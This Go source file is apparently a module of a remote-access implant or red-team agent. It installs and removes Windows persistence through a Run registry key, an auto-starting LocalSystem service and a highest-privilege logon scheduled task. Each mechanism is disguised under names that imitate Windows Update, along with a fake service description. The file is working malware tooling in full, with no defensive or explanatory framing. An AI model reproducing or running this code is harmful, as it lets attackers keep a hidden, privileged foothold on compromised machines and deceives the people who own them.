package modules

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// PersistModule handles persistence installation/removal.
func PersistModule(args string) (string, string, int) {
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: persist <install|remove> <registry|service|schtasks> [path]", 1
	}

	action := parts[0]
	method := parts[1]
	binaryPath := ""
	if len(parts) > 2 {
		binaryPath = parts[2]
	}

	if runtime.GOOS != "windows" {
		return "", "persistence only supported on Windows", 1
	}

	switch method {
	case "registry":
		return persistRegistry(action, binaryPath)
	case "service":
		return persistService(action, binaryPath)
	case "schtasks":
		return persistScheduledTask(action, binaryPath)
	default:
		return "", fmt.Sprintf("unknown method: %s (registry|service|schtasks)", method), 1
	}
}

func persistRegistry(action, path string) (string, string, int) {
	regPath := `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	valueName := "WindowsUpdate"

	if action == "install" {
		if path == "" {
			path, _ = os.Executable()
		}
		cmd := exec.Command("reg", "add", regPath, "/v", valueName, "/t", "REG_SZ", "/d", path, "/f")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", string(out), 1
		}
		return fmt.Sprintf("Registry persistence installed: %s -> %s", valueName, path), "", 0
	}

	cmd := exec.Command("reg", "delete", regPath, "/v", valueName, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", string(out), 1
	}
	return "Registry persistence removed", "", 0
}

func persistService(action, path string) (string, string, int) {
	serviceName := "WindowsUpdateHelper"
	_ = "Windows Update Helper Service"

	if action == "install" {
		if path == "" {
			path, _ = os.Executable()
		}
		cmd := exec.Command("sc", "create", serviceName, "binPath=", path, "start=", "auto", "obj=", "LocalSystem")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", string(out), 1
		}
		desc := exec.Command("sc", "description", serviceName, "Maintains your Windows installation up to date.")
		desc.Run()
		start := exec.Command("sc", "start", serviceName)
		start.Run()
		return fmt.Sprintf("Service persistence installed: %s -> %s", serviceName, path), "", 0
	}

	exec.Command("sc", "stop", serviceName).Run()
	cmd := exec.Command("sc", "delete", serviceName)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", string(out), 1
	}
	return "Service persistence removed", "", 0
}

func persistScheduledTask(action, path string) (string, string, int) {
	taskName := "WindowsUpdateCheck"

	if action == "install" {
		if path == "" {
			path, _ = os.Executable()
		}
		cmd := exec.Command("schtasks", "/Create", "/tn", taskName,
			"/tr", path, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", string(out), 1
		}
		return fmt.Sprintf("Scheduled task persistence installed: %s -> %s", taskName, path), "", 0
	}

	cmd := exec.Command("schtasks", "/Delete", "/tn", taskName, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", string(out), 1
	}
	return "Scheduled task persistence removed", "", 0
}
